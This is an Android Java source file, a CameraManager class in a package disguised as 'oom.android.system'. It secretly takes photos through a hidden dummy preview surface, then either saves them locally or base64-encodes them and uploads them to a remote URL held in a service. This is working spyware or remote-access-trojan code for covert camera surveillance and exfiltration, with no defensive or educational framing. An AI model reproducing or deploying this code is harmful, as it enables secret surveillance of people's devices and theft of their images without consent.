package oom.android.system.Managers;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.util.List;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MainActivity;
import oom.android.system.app.MyService;
import oom.android.system.Settings.TypeOpenFile;

public class CameraManager {

    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        try {
            this.context =context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startUp(int cameraID, final boolean Online){
        try{
            releaseCamera();
            camera = Camera.open(cameraID);
        }catch (RuntimeException e){
            e.printStackTrace();
        }

        Log.d("MyLogs","Cam "+cameraID +" open");
        Camera.CameraInfo info = new Camera.CameraInfo();
        Camera.getCameraInfo(cameraID, info);

        int rotation = MainActivity.activity.getWindowManager().getDefaultDisplay().getRotation();
        int degrees = 0;

        switch (rotation) {
            case Surface.ROTATION_0:
                degrees = 0;
                break; //Natural orientation
            case Surface.ROTATION_90:
                degrees = 90;
                break; //Landscape left
            case Surface.ROTATION_180:
                degrees = 180;
                break;//Upside down
            case Surface.ROTATION_270:
                degrees = 270;
                break;//Landscape right
            default:
                throw new IllegalStateException("Unexpected value: " + rotation);
        }


        int rotate = ( info.orientation - degrees + 360 ) % 360;

        Parameters parameters = camera.getParameters();

        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        parameters.setRotation(rotate);


        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        camera.takePicture(null, null, new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                if(Online)
                    sendPhoto(data);
                else
                    savePhoto(data);
                releaseCamera();
            }
        });
    }

    private void savePhoto(byte [] data){

        try {
            FileOutputStream fos = new FileOutputStream(MyService.OpenFile(TypeOpenFile.Photo));
            fos.write(data);
            fos.close();
        } catch (Exception e) {

        }
    }

    private void sendPhoto(byte [] data){

        try {

            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);

            byte[] byteArr = bos.toByteArray();
            final String encodedImage =  "data:image/jpeg;base64,"+ Base64.encodeToString(byteArr, Base64.DEFAULT);


            post(MyService.output_img,encodedImage);


        } catch (Exception e) {
            Log.e("Error",e.getMessage());
            releaseCamera();
        }

    }

    public void post(String url,String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }

    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();

            camera = null;
        }
    }


}
